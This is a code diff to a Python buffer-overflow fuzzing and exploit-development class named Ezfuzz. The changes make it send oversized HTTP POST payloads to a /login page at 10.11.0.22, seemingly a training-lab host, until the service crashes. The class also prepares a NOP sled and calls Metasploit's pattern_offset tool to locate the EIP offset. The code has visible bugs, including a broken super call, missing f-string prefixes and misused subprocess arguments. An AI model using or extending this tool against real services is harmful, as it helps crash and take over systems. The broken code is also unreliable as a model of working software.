@@ -2,6 +2,8 @@ try:
 	import subprocess as sp
 	import socket as s
 	import logging
+	from re import search
+	from time import sleep
 except ImportError as err:
 	print(f"Import Error: {err}")
 
@@ -17,7 +19,7 @@ b = "\033[94m"
 """Custom error classes created for Ezfuzz"""
 class InvalidTargetIPError(TypeError):
 	"""Will be raised if the type of the target IP
-	is not of type 'str'.
+	is not of type 'str'
 	"""
 	def __init__(self, error_msg):
 		super.__init__(error_msg)
@@ -25,14 +27,14 @@ class InvalidTargetIPError(TypeError):
 
 class InvalidTargetPortError(TypeError):
 	"""Will be raised if the type of the target IP
-	is not of type 'int'.
+	is not of type 'int'
 	"""
 	def __init__(self, error_msg):
 		super.__init__(error_msg)
 
 
 class NoOffsetError(ValueError):
-	"""Raised if offset property has not been set."""
+	"""Raised if offset property has not been set"""
 	def __init__(self, error_msg):
 		super.__init__(error_msg)
 
@@ -67,28 +69,63 @@ class Ezfuzz:
 			_num_bytes_crash (int): The number of bytes it took to crash the system.
 									Note: the bytes are sent in increments of 50.
 			_receive_bytes (int): The number of bytes we will receive from the target machine at once.
+
+		Raises:
+			exceptions.InvalidTargetIPError if invalid IP addresses is passed as an argument.
+			exceptions.InvalidTargetPortError if invalid port number is passed as an argument.
 		"""
 		try:
 			if not isinstance(targ_IP, str):
 				raise exceptions.InvalidTargetIPError(r+"The target IP address must be a string."+rst)
+			if not search(r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", targ_IP):
+				raise exceptions.InvalidTargetIPError(r+"The target IP address is not a valid IP address."+rst)
 			self._targ_IP = targ_IP
 			if not isinstance(targ_port, int):
 				raise exceptions.InvalidTargetPortError(r+"The target port number must be an integer between 1-65535"+rst)
 			self._targ_port = targ_port
-		except TypeError as err:
-			print(r+"Error: {err}"+rst)
+		except exceptions.InvalidTargetIPError as err:
+			print(r+"Invalid Target IP: {err}"+rst)
+		except exceptions.InvalidTargetPortError as err:
+			print(r+"Invalid Target Port Error: {err}"+rst)
 
 		self._bad_chars_found = []
 		self._nop_sled = "\x90"*16
 		self._offset = None
 		self._num_bytes_crash = None
-		self._receive_bytes = 1024
 
 
 	def __repr__(self):
-		return (f"Ezfuzz(targ_IP={self.targ_IP},targ_port={self.targ_port}")
+		return (f"Ezfuzz(targ_IP='{self.targ_IP}',targ_port={self.targ_port},"
+				f"nop_sled={self._nop_sled},bad_characters={self._bad_chars_found},"
+				f"offset={self._offset},num_bytes_crash={self._num_bytes_crash})")
 
 
+	def __str__(self):
+		return f"Ezfuzz(target_IP_address='{self.targ_IP}', target_port={self.targ_port})"
+
+
+	@property
+	def targ_IP(self):
+		"""Returns the current target's IP address"""
+		return self._targ_IP
+
+
+	@targ_IP.setter
+	def targ_IP(self, new_IP):
+		"""Sets a new IP addresses"""
+		self._targ_IP = new_IP
+
+	@property
+	def targ_port(self):
+		"""Returns the target application port number"""
+		return self._targ_port
+
+	@targ_port.setter
+	def targ_port(self, new_port):
+		"""Sets a new port number for target application"""
+		self._targ_port = new_port
+	
+	
 	@property
 	def bad_chars(self):
 		"""Return the bad characters set by user."""
@@ -173,14 +210,22 @@ class Ezfuzz:
 		while True:
 			soc = self._create_socket()
 			with soc:
+				content = "username=" + 'A'*self._num_bytes_crash + "&password=A"
+				buff = "POST /login HTTP/1.1\r\n"
+				buff += "Host: 10.11.0.22\r\n"
+				buff += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+				buff += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+				buff += "Accept-Language: en-US,en;q=0.5\r\n"
+				buff += "Referer: http://10.11.0.22/login\r\n"
+				buff += "Connection: close\r\n"
+				buff += "Content-Type: application/x-www-form-urlencoded\r\n"
+				buff += f"Content-Length: {str(len(content))}\r\n"
+				buff += "\r\n"
+				buff += content
 				try:
-					self._buffer = 'A'*self._num_bytes_crash
-					while True:
-						soc.recv(self._receive_bytes)
-						soc.send("Test\r\n")
-						soc.recv(self._receive_bytes)
-						soc.send(self._buffer)
-						soc.close()
+					soc.send(buff)
+					soc.close()
+					sleep(10)
 				except:
 					print(f"Number of bytes sent at crash: {self._num_bytes_crash}")
 					self._num_bytes_crash -= 50
@@ -209,9 +254,10 @@ class Ezfuzz:
 		"""
 
 		Args:
-			EIP_characters (str): The address that overwrote the EIP when """
+			EIP_characters (str): The address that overwrote the EIP when program crashed
+		"""
 		output = sp.run(['usr/share/metasploit-framework/tools/pattern_offset.rb'], EIP_characters)
-		self._offset(output.stdout)
+		self.offset(output.stdout)
 
 
 	def test_offset(self):
